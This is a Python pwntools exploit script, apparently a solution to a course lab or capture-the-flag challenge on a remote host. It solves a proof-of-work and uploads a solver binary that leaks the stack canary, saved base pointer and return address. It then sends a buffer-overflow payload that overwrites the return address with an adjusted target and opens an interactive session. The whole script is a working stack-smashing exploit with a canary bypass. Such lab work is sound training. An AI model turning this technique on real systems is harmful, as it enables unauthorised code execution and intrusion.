#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process: # if r is a remote, solve pow
    pw.solve_pow(r)
print("type of r = ", type(r))
if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
    
else:
    r.sendlineafter(b'send to me? ', b'0')

print("recv1:",r.recv().decode()) #b'** code: 16824 byte(s) received.\n'
solver_data = r.recv().decode().split()
print("solver data size", len(solver_data))
canary = solver_data[0]
rbp = solver_data[1]
return_addr = solver_data[2]
print("-------------")
print("canary =", canary, "\nreturn address =", return_addr, "\nrbp =", rbp)
print("-------------")
print("recv2:",solver_data) #b'77202c6f6c6c6568 21646c726f 7ffd2e44c148'
ans = b'0'*24 + p64((int(canary, base=16))) + p64((int(rbp, base=16))) + p64(int(return_addr, base=16)+ (0xa3aa - 0xa2ff)) + (b'\x00' * 60)
print("send", ans)
if solver_data[len(solver_data)-1] == 'answer?':
    r.sendline(ans)
else :
    r.sendlineafter(b'Show me your answer?', ans)
r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
